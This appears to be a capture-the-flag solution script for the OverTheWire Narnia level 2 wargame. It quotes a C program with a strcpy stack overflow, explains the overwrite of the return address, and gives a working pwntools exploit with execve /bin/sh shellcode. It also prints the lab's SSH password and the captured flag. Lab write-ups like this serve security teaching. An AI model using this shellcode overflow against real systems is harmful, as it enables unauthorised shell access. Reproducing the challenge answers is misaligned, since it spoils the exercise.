'''
OverTheWire
Narnia Level2
Jake Mai

Source Code:

************************************************************************

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}

************************************************************************


local var buf is declared right at the top => should be right under ebp
fill up 128 bytes of buf with payload and fillers + 4 bytes of ebp (32 bit binary), then overwrite eip with new ret address to execute payload

'''
# Exploit

from pwn import *

def pwn():
    shesh=ssh(host="narnia.labs.overthewire.org",
            user="narnia2",
            password="nairiepecu",
            port=2226)

    # sc length: 28 bytes
    sc="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
    fillers="A"*100+"BBBB"
    # new ret address is hard coded since ASLR is disabled
    ret="\x30\xd8\xff\xff"
    payload=sc+fillers+ret
    # lego.sendline(payload)

    lego=shesh.process(['/narnia/narnia2', payload])
    lego.interactive()

if __name__ == "__main__":
    pwn()

# Got a new shell with new uid: cat flag:
# flag: vaequeezee
